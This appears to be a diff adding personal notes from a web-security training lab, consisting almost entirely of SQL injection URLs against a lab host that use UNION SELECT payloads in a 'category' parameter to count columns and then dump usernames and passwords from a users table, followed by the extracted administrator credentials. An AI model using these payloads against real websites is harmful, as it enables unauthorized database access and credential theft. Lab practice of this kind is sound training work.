@@ -1,0 +1,9 @@
+https://ac0e1fc31e1da888807b694c004900a3.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL--
+
+
+https://ac0e1fc31e1da888807b694c004900a3.web-security-academy.net/filter?category=Pets' UNION SELECT 'a','a'--
+
+https://ac0e1fc31e1da888807b694c004900a3.web-security-academy.net/filter?category=Pets' UNION SELECT username,password FROM users--
+
+Username: administrator
+Password: 7o2uuo2vn8hbu6zbfp2g
